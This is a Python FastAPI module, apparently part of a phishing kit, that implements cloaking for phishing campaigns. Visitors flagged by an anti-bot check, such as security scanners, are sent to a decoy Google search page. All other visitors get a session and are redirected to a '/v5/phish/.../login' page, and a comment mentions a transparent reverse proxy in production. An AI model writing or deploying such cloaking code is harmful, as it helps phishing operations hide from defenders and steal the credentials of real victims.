from typing import Dict, Optional
from fastapi import Request, HTTPException, status
from fastapi.responses import RedirectResponse
from core.redirect.antibot import antibot
from core.session.session_manager import session_manager

class SmartRedirector:
    """
    Moteur de Redirection Intelligent (Tier 2 Logic)
    Gère le filtrage du trafic et la redirection dynamique vers le Core ou le Blackhole.
    """
    
    DECOY_URL = "https://www.google.com/search?q=security+scan"
    
    def __init__(self, use_antibot: bool = True):
        self.use_antibot = use_antibot
        self.antibot = antibot
        self.session_manager = session_manager
    
    async def process_request(self, request: Request, target_campaign_id: str):
        """
        Traite la requête entrante, vérifie les bots, et redirige.
        """
        client_ip = request.client.host
        user_agent = request.headers.get("user-agent", "")
        
        # 1. Vérification Anti-Bot
        if self.use_antibot:
            check_result = await self.antibot.check_request(request)
            
            if check_result["blocked"]:
                print(f"[ANTIBOT] Bloqué: {check_result['reason']} (IP: {client_ip})")
                return RedirectResponse(url=self.DECOY_URL, status_code=status.HTTP_302_FOUND)
        
        # 2. Création de Session (Valid Visitor)
        session_id = self.session_manager.create_session(
            campaign_id=target_campaign_id,
            client_ip=client_ip,
            user_agent=user_agent
        )
        
        # 3. Redirection vers le Core / Landing Page avec Session ID
        # En production, on utiliserait un reverse proxy transparent.
        # Ici on redirige vers l'URL de phishing avec le token de session.
        
        # Simulation d'accès autorisé
        return {
            "status": "allowed",
            "campaign_id": target_campaign_id,
            "session_id": session_id,
            "redirect_to": f"/v5/phish/{target_campaign_id}/login?sid={session_id}",
            "message": "Traffic clean. Session created."
        }

# Instance globale
smart_redirector = SmartRedirector()
